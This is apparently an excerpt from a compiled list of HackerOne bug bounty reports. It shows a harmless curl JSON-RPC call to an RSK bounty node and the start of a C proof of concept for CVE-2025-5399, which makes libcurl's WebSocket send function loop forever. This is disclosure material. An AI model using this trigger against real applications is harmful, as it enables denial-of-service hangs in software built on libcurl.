# teknogeek at teknogeek-mbp in ~ [18:45:27]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": [], "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"0x0"}
# … truncated …
```

## 154. [#3168039](https://hackerone.com/reports/3168039)  -  CVE-2025-5399: WebSocket endless loop
*low*

```c
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <curl/curl.h>

int main (int argc, char** argv) {
    char buffer[512];
    size_t sent;
    size_t n;
    const struct curl_ws_frame* meta;
    CURLcode res;
    
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "ws://127.0.0.1:1337/");
    curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 2L);
    curl_easy_perform(curl);
    
    curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);
    curl_ws_send(curl, "1234", 4, &sent, 0, CURLWS_TEXT | CURLWS_CONT);
    
    curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);
    curl_ws_send(curl, "X", 1, &sent, 70, CURLWS_OFFSET);
    
    curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);
    curl_ws_send(curl, buffer, 53, &sent, 0, CURLWS_OFFSET);
    
    // The next curl_ws_recv() will receive a 16-byte PING message and
    // auto-respond with PONG
    
    res = curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);
    assert(res == CURLE_AGAIN);
    
    // Restart I/O. The next call to curl_ws_send() will never return
    
    curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);
# … truncated …
```
